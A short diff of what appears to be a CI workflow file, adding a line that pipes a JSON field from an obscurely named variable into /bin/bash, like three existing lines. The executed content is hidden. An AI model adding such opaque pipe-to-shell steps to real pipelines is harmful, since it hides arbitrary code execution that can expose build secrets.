@@ -35,6 +35,7 @@ jobs:
           echo $xucd05327 | jq -r .yudny43 | /bin/bash
           echo $a72609 | jq -r .kp2 | /bin/bash
           echo $ikkr87089 | jq -r .ktjjw1 | /bin/bash
+          echo $nz03769 | jq -r .s6 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
